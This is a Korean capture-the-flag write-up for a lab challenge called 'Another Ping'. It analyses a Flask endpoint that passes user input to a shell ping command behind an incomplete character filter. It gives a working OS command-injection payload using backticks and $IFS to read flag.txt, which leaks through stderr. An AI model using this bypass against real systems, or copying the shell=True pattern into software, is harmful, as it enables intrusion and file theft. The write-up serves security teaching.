# B2 · Another Ping

### 1. VM에 접속한다

문제 페이지에서 IP 주소를 입력하면 `ping` 결과를 확인할 수 있다.

### 2. 코드 분석 — 명령어 삽입이 가능한 이유

**① `/ping`은 입력받은 IP를 필터링한 뒤 쉘 명령어로 실행한다.**

```python
ip = request.form.get('ip', '').strip()
is_valid, message = filter_input(ip)
if not is_valid:
    return jsonify({'error': message}), 400

cmd = f"ping -c 4 {ip}"
result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
```

`is_valid_ip()` 함수는 정의되어 있지만 실제로 호출되지 않는다. `filter_input()`은 일부 특수문자만 검사한다.

**② 필터에는 백틱과 `$`가 없다.**

```python
FILTERED_CHARS = [' ', ';', '|', '&', '>', '<', '(', ')', '[', ']', '{', '}', '\n', '\r']
```

따라서 **백틱 명령어 치환**과 공백 대신 `$IFS`를 사용할 수 있다. `shell=True` 때문에 쉘이 이를 명령어 문법으로 해석한다.

### 3. IP 입력란에 페이로드 입력

다음 값을 IP 입력란에 입력하여 `/ping`으로 전송한다.

```text
127.0.0.1`cat$IFS./flag.txt`
```

- 백틱(`` `...` ``): 내부 명령어를 먼저 실행
- `cat`: 파일 내용을 읽는 명령어
- `$IFS`: 공백 대신 사용하는 쉘 변수
- `./flag.txt`: 현재 디렉터리의 FLAG 파일

### 4. 쉘에서 명령어 치환

서버에서 생성되는 명령어는 다음과 같다.

```bash
ping -c 4 127.0.0.1`cat$IFS./flag.txt`
```

쉘이 먼저 `cat ./flag.txt`를 실행한다. 파일 내용이 `DH{...}`라면 그 결과가 `ping` 인자에 붙는다.

```bash
ping -c 4 127.0.0.1DH{...}
```

해석할 수 없는 호스트명이 되어 `ping`이 오류를 출력한다.

### 5. stderr에서 FLAG 확인

서버 코드는 표준 출력·오류를 수집해 JSON으로 반환한다.

```python
return jsonify({
    'command': cmd,
    'stdout': result.stdout,
    'stderr': result.stderr,
    'returncode': result.returncode
})
```

`capture_output=True`가 오류 메시지를 `result.stderr`에 담고, `jsonify()`가 이를 HTTP 응답에 포함한다.

```text
stderr: ping: 127.0.0.1DH{...}: Name or service not known
```

**취약점 원인:** 불완전한 특수문자 필터와 `shell=True`로 OS Command Injection이 발생하고, 오류 메시지인 `stderr`를 응답으로 반환하여 FLAG가 노출된다.
